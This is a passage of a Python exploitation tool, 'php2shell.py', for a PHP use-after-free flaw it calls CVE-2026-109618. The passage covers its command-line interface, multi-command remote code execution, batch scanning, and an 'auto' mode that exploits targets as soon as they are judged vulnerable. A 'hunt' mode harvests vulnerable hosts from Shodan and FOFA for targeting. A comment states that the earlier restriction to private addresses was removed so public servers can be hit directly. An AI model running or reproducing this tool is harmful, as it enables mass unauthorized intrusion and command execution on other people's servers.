            print(info('  [%d/%d] %s' % (i, len(cmds), c)))
        r = run_exploit(url, sink_path, c, pf, rounds=args.rounds,
                        stage1_n=args.stage1_n, stage2_t=args.stage2_t,
                        zif=args.zif_offset, dtor=args.dtor_offset,
                        htdata=args.htdata_offset,
                        leak_retries=args.leak_retries, timeout=args.timeout,
                        ht_size=args.ht_size,
                        proof_require=getattr(args, 'proof_require', None),
                        readback_require=getattr(args, 'readback_require', None),
                        host_header=getattr(args, 'host_header', None))
        r['cmd'] = c
        results.append(r)
        if single:
            return r
        if r.get('ok'):
            print(ok('        -> OK'))
        else:
            print(bad('        -> failed: %s' % r.get('reason')))
        if getattr(args, 'rate', 0):
            time.sleep(args.rate)
    okn = sum(1 for r in results if r.get('ok'))
    last = dict(results[-1])
    last['multi'] = {'total': len(cmds), 'ok': okn, 'results': results}
    last['ok'] = okn > 0
    print(info('[multi] done: %d/%d commands succeeded' % (okn, len(cmds))))
    return last


def summarize(rpt):
    v = rpt.get('verdict', V_SAFE)
    color = {V_RCE: ok, V_LIKELY: ok, V_PREMISES: warn, V_DOS: warn, V_SAFE: dim,
             V_NOSINK: warn, V_DOWN: bad}.get(v, dim)
    print()
    print(bold('=' * 62))
    print('Target : %s' % rpt.get('url'))
    print('Verdict: %s' % color(v))
    if rpt.get('php_version'):
        print('PHP    : %s' % rpt['php_version'])
    if rpt.get('precondition'):
        print('Precond: %s' % rpt['precondition'])
    if rpt.get('memory_limit'):
        print('Memory : memory_limit = %s bytes' % rpt['memory_limit'])
    if rpt.get('oom_landing') is not None:
        print('OOM at : tried = %s bytes' % rpt['oom_landing'])
    if rpt.get('landing_stage'):
        print('Stage  : %s' % rpt['landing_stage'])
    sinks = rpt.get('steps', {}).get('sinks')
    if sinks:
        print('Sink   : %s' % ', '.join(s['path'] for s in sinks[:4]))
    print(bold('=' * 62))


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------
def build_parser():
    ap = argparse.ArgumentParser(
        prog='php2shell.py',
        description='CVE-2026-109618 integrated automated detection and exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Examples:\n'
               '  php2shell.py http://t/index.php\n'
               '  php2shell.py scan -u http://t/ --safe\n'
               "  php2shell.py exploit -u http://t/ -c 'id>/tmp/p'\n"
               '  php2shell.py batch -f list.txt --workers 4 -o out.json\n')
    sub = ap.add_subparsers(dest='subcmd')

    def common(p):
        p.add_argument('-u', '--url', help='target URL')
        p.add_argument('-f', '--file', help='target list file (one per line)')
        p.add_argument('-o', '--out', default=None, help='JSON report output path')
        p.add_argument('--json', action='store_true', help='output JSON only')
        p.add_argument('--timeout', type=float, default=20.0, help='per-request timeout in seconds, default 20')
        p.add_argument('--max-mb', type=int, default=32, help='max body MB for CL probing, default 32')
        p.add_argument('--workers', type=int, default=4, help='batch concurrency, default 4')
        p.add_argument('--workers-dirty', type=int, default=8, help='number of workers to taint concurrently, default 8')
        p.add_argument('--no-color', action='store_true')
        p.add_argument('--dry-run', action='store_true',
                       help='only print the parsed targets, send no requests')
        p.add_argument('--no-active-uaf', action='store_true',
                       help='skip the active UAF test (degrades to precondition check only, no RCE conclusion)')
        p.add_argument('--active-rounds', type=int, default=2,
                       help='active UAF test rounds, default 2 (same-connection taint->dereference)')
        p.add_argument('--insecure', action='store_true',
                       help='skip TLS certificate verification for https targets (authorized labs with self-signed/expired certs); strict verification by default')

    for name, hlp in (('auto', 'detect, then exploit automatically if judged RCE-capable'),
                      ('scan', 'detect only (no exploitation)'),
                      ('exploit', 'three-stage RCE directly (automatic leaking)'),
                      ('batch', 'batch detection')):
        p = sub.add_parser(name, help=hlp)
        common(p)
        if name in ('scan', 'auto', 'batch'):
            p.add_argument('--safe', action='store_true',
                           help='skip heap corruption verification (note: OOM probe bodies are still sent; for pure read-only use p2s_ext.py recon)')
            p.add_argument('--try-leak', action='store_true',
                           help='add the Stage-1 leak probe to distinguish affected/patched (involves OOM, destructive)')
            p.add_argument('--leak-rounds', type=int, default=6)
        if name == 'scan':
            p.add_argument('--stage1-n', type=int, default=None)
        if name in ('exploit', 'auto'):
            p.add_argument('-c', '--cmd', action='append', default=None,
                           metavar='CMD',
                           help='command (<=%d bytes); repeatable, executed one by one in order' % CMD_CAPACITY)
            p.add_argument('--cmd-file', default=None,
                           metavar='FILE',
                           help='command file, one per line (blank lines and # comments are ignored)')
            p.add_argument('--proof-file', default=None, help='proof file path (effective for a single command)')
            p.add_argument('--proof-require', default=None, metavar='REGEX',
                           help='regex the proof content must match (e.g. "uid=\\d+"); no match means not successful')
            p.add_argument('--readback-require', default=None, metavar='REGEX',
                           help='regex the HTTP readback content must match; used to rule out soft 404/fallback pages')
            p.add_argument('--host-header', default=None, metavar='HOST',
                           help='override the Host header (for hitting by IP when the vhost only accepts a domain)')
            p.add_argument('--proof-dir', default=None, metavar='DIR',
                           help='local proof dir for multiple commands: >/out/x in a command maps to DIR/x')
            p.add_argument('--ht-size', type=int, default=HT_SIZE, metavar='N',
                           help='fake struct size in bytes (default %d, capacity=%d bytes); '
                                'enlarging it requires recalibrating --htdata-offset' % (HT_SIZE, CMD_CAPACITY))
            p.add_argument('--rounds', type=int, default=30)
            p.add_argument('--proxy', default=None, metavar='URL',
                           help='egress through a single proxy (http:// or socks5://, may carry user:pass@); '
                                'for corporate proxies/intranet jump hosts/integration with Burp')
            p.add_argument('-H', '--header', action='append', default=None,
                           metavar='"K: V"',
                           help='append/override request headers, repeatable. e.g. -H "User-Agent: my-test"')
            p.add_argument('--source-addr', action='append', default=None, metavar='IP',
                           help='bind a local source address, repeatable (rotated per connection). Only addresses already configured on this host, '
                                'used for multi-source concurrent testing of LB stickiness/per-IP rate limiting/risk-control logic; '
                                'a non-local address will fail to bind')
            p.add_argument('--rate', type=float, default=0.0, metavar='SEC',
                           help='seconds between commands (default 0), to leave the target time to recover')
            p.add_argument('--stage1-n', type=int, default=None)
            p.add_argument('--stage2-t', type=int, default=None)
            p.add_argument('--zif-offset', type=lambda x: int(x, 0), default=None)
            p.add_argument('--dtor-offset', type=lambda x: int(x, 0), default=None)
            p.add_argument('--htdata-offset', type=lambda x: int(x, 0), default=None)
            p.add_argument('--leak-retries', type=int, default=3)

    # ---- hunt: asset discovery and version judgement (Shodan / FOFA, passive search) ----
    hp = sub.add_parser(
        'hunt', help='asset discovery: Shodan/FOFA search + PHP version judgement (no vulnerability probing)')
    hp.add_argument('--shodan-key', default=None,
                    help='Shodan API key (or the SHODAN_API_KEY environment variable)')
    hp.add_argument('--fofa-key', default=None,
                    help='FOFA API key (or the FOFA_KEY environment variable)')
    hp.add_argument('--fofa-email', default=None,
                    help='FOFA account email (required by some API versions)')
    hp.add_argument('--query', action='append', default=None, metavar='Q',
                    help='custom query, repeatable; built-in PHP queries are used if omitted')
    hp.add_argument('--php-version', default=None, metavar='X.Y.Z',
                    help='filter by a specific PHP version, e.g. 8.4.26 (queries for both engines are generated)')
    hp.add_argument('--pages', type=int, default=1,
                    help='number of Shodan pages (100 results per page, 1 query credit per page)')
    hp.add_argument('--size', type=int, default=100,
                    help='max results returned by FOFA (subject to account permissions)')
    hp.add_argument('--from-json', default=None, metavar='FILE',
                    help='offline import of a saved API response (works without a key)')
    hp.add_argument('--fingerprint', action='store_true',
                    help='send one plain GET per candidate and read the headers to judge the version; '
                         'this is the only action that touches targets, producing 1 access log entry per IP')
    hp.add_argument('--fp-limit', type=int, default=200,
                    help='max entries probed by --fingerprint (default 200)')
    hp.add_argument('--only-affected', action='store_true',
                    help='keep only AFFECTED in the output')
    hp.add_argument('--emit-targets', default=None, metavar='FILE',
                    help='write AFFECTED targets as a URL list for scan / batch')
    hp.add_argument('--timeout', type=float, default=20.0)
    hp.add_argument('--proxy', default=None)
    hp.add_argument('--json', action='store_true')
    hp.add_argument('--no-color', action='store_true')
    return ap


def normalize_url(raw):
    raw = raw.strip()
    if not raw or raw.startswith('#'):
        return None
    if '://' not in raw:
        raw = 'http://' + raw
    # A bare IPv6 address must be bracketed, otherwise urlparse treats the first segment as host and the rest as port
    try:
        rest = raw.split('://', 1)[1]
        authority = re.split(r'[/?#]', rest, 1)[0]
        if authority.count(':') >= 2 and not authority.startswith('['):
            socket.inet_pton(socket.AF_INET6, authority)
            raw = raw.replace(authority, '[%s]' % authority, 1)
    except Exception:
        pass
    return raw


# --------------------------------------------------------------------------
# Scope guard removed
#
# Older versions only allowed loopback/private addresses by default; public ones had to be in the --scope-file allowlist. Now
# no address-range check is performed at all: public IPs can be targeted directly. Authorization responsibility rests entirely with the user.
# --------------------------------------------------------------------------


def active_crash_probe(url, timeout=30.0, rounds=2):
    """Active UAF test: A (taint request) -> B (dereference request) on the same keep-alive connection.

    This is the key step that upgrades "preconditions met" to "UAF verified in practice": patched versions
    consistently report no crash under this criterion (PREMISES / SAFE), whereas affected versions
    deterministically kill the worker. Returns {'verdict': 'worker_killed'|'no_crash'|...}.
    """
    try:
        import php2shell_attack as kaa
    except Exception as exc:  # module missing or environment unsupported
        return {'verdict': 'unavailable', 'error': repr(exc), 'crashes': 0}
    try:
        atk = kaa.Attack(url, kaa.Weapon(), max(float(timeout), 30.0), verbose=False)
        res = dict(atk.crash_test(rounds=rounds) or {})
        res.setdefault('rounds', rounds)
        return res
    except Exception as exc:
        return {'verdict': 'error', 'error': repr(exc), 'crashes': 0}




def do_scan_only(url, args):
    rpt = scan_target(url, args)
    if not args.json:
        summarize(rpt)
    return rpt


def do_auto(url, args):
    rpt = scan_target(url, args)
    if not args.json:
        summarize(rpt)
    verdict = rpt.get('verdict')
    if verdict in (V_RCE, V_LIKELY):
        sinks = rpt.get('steps', {}).get('sinks') or []
        sink = sinks[0]['path'] if sinks else '/'
        if not args.json:
            print()
            log('auto', ok('judged RCE-capable, entering the exploitation stage automatically'))
        res = exploit_target(url, sink, args)
        rpt['exploit'] = res
        if not args.json:
            if res.get('ok'):
                print()
                log('auto', ok('RCE succeeded'))
                if res.get('proof'):
                    print(dim('--- proof ---'))
                    print(res['proof'].strip())
            else:
                log('auto', bad('exploitation failed: %s' % res.get('reason', '')))
    elif not args.json:
        log('auto', warn('not judged RCE-ready, skipping exploitation (use the exploit subcommand to force an attempt)'))
    return rpt


def do_batch(args):
    targets = []
    if args.file:
        with open(args.file, 'r', encoding='utf-8', errors='replace') as fh:
            for line in fh:
                u = normalize_url(line)
                if u:
                    targets.append(u)
    if args.url:
        targets.append(normalize_url(args.url))
    if not targets:
        print('batch mode requires -f target file', file=sys.stderr)
        return [], 1

    if getattr(args, 'dry_run', False):
        for u in targets:
            print('[dry-run] target: %s' % u)
        print('[dry-run] %d targets in total, no requests sent' % len(targets))
        return [], 0

    results = []
    log('batch', '%d targets in total, concurrency %d' % (len(targets), args.workers))
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as pool:
        futs = {pool.submit(scan_target, u, args): u for u in targets}
        for f in as_completed(futs):
            u = futs[f]
            try:
                results.append(f.result())
            except Exception as e:
                results.append({'url': u, 'verdict': V_DOWN, 'error': str(e)})
    results.sort(key=lambda x: x.get('url', ''))
    for r in results:
        if not args.json:
            summarize(r)
    counts = {}
    for r in results:
        counts[r.get('verdict')] = counts.get(r.get('verdict'), 0) + 1
    print()
    log('batch', 'summary: %s' % ', '.join('%s=%d' % kv for kv in sorted(counts.items())))
    return results, 0


def do_hunt(args):
    """
    Asset discovery: passive Shodan / FOFA search + optional passive fingerprinting + version judgement.

    Explicitly out of scope: no vulnerability probing against search results, no OOM requests, no automatic exploit.
    Before running scan/exploit on any result, authorization responsibility lies with the user.
    """
    try:
        import discover
    except ImportError:
        print('missing attack/discover.py, please run from the full delivery package', file=sys.stderr)
        return 1

    items = []

    # 1) Offline import
    if args.from_json:
        items = discover.load_from_json(args.from_json)
        log('hunt', 'imported %d entries offline: %s' % (len(items), args.from_json))

    # 2) Online search
    else:
        skey = args.shodan_key or os.environ.get('SHODAN_API_KEY')
        fkey = args.fofa_key or os.environ.get('FOFA_KEY')
        if not skey and not fkey:
            print('no API key provided. Use --shodan-key / --fofa-key, '
                  'or the SHODAN_API_KEY / FOFA_KEY environment variables, '
                  'or import a saved response with --from-json.', file=sys.stderr)
            return 1

        queries = list(args.query or [])
        if not queries:
            queries = [discover.shodan_query(args.php_version)] if skey else []
            fq = discover.fofa_query(args.php_version)
            if fkey:
                queries.append(fq)
        log('hunt', 'queries: %s' % ' | '.join(queries))

        if skey:
            for q in queries:
                if q.startswith('header='):
                    continue
                rows, err = discover.shodan_search(
                    skey, q, pages=args.pages,
                    timeout=args.timeout, proxy=args.proxy)
                if err:
                    log('hunt', err)
                else:
                    log('hunt', 'Shodan "%s" → %d entries' % (q[:48], len(rows)))
                    items.extend(rows)
        if fkey:
            for q in queries:
                if not q.startswith('header=') and len(queries) > 1:
                    continue
                rows, err = discover.fofa_search(
                    fkey, q, size=args.size,
                    timeout=args.timeout, proxy=args.proxy,
                    email=args.fofa_email)
                if err:
                    log('hunt', err)
                else:
                    log('hunt', 'FOFA "%s" → %d entries' % (q[:48], len(rows)))
                    items.extend(rows)

    items = discover.dedupe(items)
    for it in items:
        it['url'] = discover.to_url(it)
        it.setdefault('verdict', '-')
        it.setdefault('note', '')
        if it.get('banner_ver') and it['verdict'] == '-':
            it['php_ver'] = it['banner_ver']
            it['verdict'], it['note'] = discover.judge(it['banner_ver'])

    # 3) Optional passive fingerprinting (the only action touching targets, one plain GET)
    if args.fingerprint and items:
        fp_items = items[:args.fp_limit]
        if fp_items:
            log('hunt', 'passive fingerprinting: %d entries, 1 plain GET each'
                        ' (no mutated payloads are sent)' % len(fp_items))
            discover.enrich(fp_items, timeout=args.timeout, proxy=args.proxy,
                            limit=args.fp_limit)

    # 4) Output
    if args.json:
        print(json.dumps(items, ensure_ascii=False, indent=2))
        n_aff = sum(1 for it in items if it.get('verdict') == 'AFFECTED')
    else:
        n_aff = discover.render(items, only_affected=args.only_affected)

    if args.emit_targets:
        n = discover.emit_targets(items, args.emit_targets, only_affected=True)
        log('hunt', 'wrote %d AFFECTED targets → %s'
                    ' (PATCHED/UNKNOWN are not written, to avoid accidental hits)' % (n, args.emit_targets))

    log('hunt', 'done: AFFECTED=%d / total=%d' % (n_aff, len(items)))
    if n_aff:
        log('hunt', 'note: this subcommand does not perform vulnerability probing. Before running scan/exploit against the above targets, '
                    'confirm yourself that authorization has been obtained.')
    return 0


def main():
    argv = sys.argv[1:]
    known = {'auto', 'scan', 'exploit', 'batch', 'hunt'}
    if argv and argv[0] not in known and not argv[0].startswith('-'):
        argv = ['auto', '-u', argv[0]] + argv[1:]
    if not argv or argv[0] in ('-h', '--help'):
        build_parser().print_help()
        return 0

    args = build_parser().parse_args(argv)
    if args.no_color:
        global USE_COLOR
        USE_COLOR = False
    if not getattr(args, 'cmd', None):
        args.cmd = 'id>/tmp/p1'

    if args.subcmd == 'batch':
        results, code = do_batch(args)
        if args.out:
            with open(args.out, 'w', encoding='utf-8') as fh:
                json.dump(results, fh, ensure_ascii=False, indent=2)
            log('batch', 'report written to %s' % args.out)
        return code

    if args.subcmd == 'hunt':
        return do_hunt(args)

    if not args.url:
        print('-u/--url is required', file=sys.stderr)
        return 1
    url = normalize_url(args.url)

    if getattr(args, 'dry_run', False):
        print('[dry-run] target: %s' % url)
        return 0

    if args.subcmd == 'scan':
        rpt = do_scan_only(url, args)
    elif args.subcmd == 'exploit':
        cli, path = new_client(url, args.timeout)
        sinks = discover_sinks(url, cli, path, timeout=args.timeout)
        sink = sinks[0]['path'] if sinks else path
        if not args.json:
            log('exploit', 'sink: %s' % sink)
        res = exploit_target(url, sink, args)
        rpt = {'url': url, 'exploit': res,
               'verdict': V_RCE if res.get('ok') else V_SAFE}
        if not args.json:
            if res.get('ok'):
                log('exploit', ok('RCE succeeded'))
                if res.get('proof'):
                    print(dim('--- proof ---'))
                    print(res['proof'].strip())
            else:
                log('exploit', bad('failed: %s' % res.get('reason', '')))
    else:
        rpt = do_auto(url, args)

    if args.out:
        with open(args.out, 'w', encoding='utf-8') as fh:
            json.dump(rpt, fh, ensure_ascii=False, indent=2)
        log('report', 'written to %s' % args.out)

    if args.json:
        print(json.dumps(rpt, ensure_ascii=False, indent=2))

    if rpt.get('exploit', {}).get('ok'):
        return 0
    return EXIT.get(rpt.get('verdict'), 30)


if __name__ == '__main__':
    sys.exit(main())
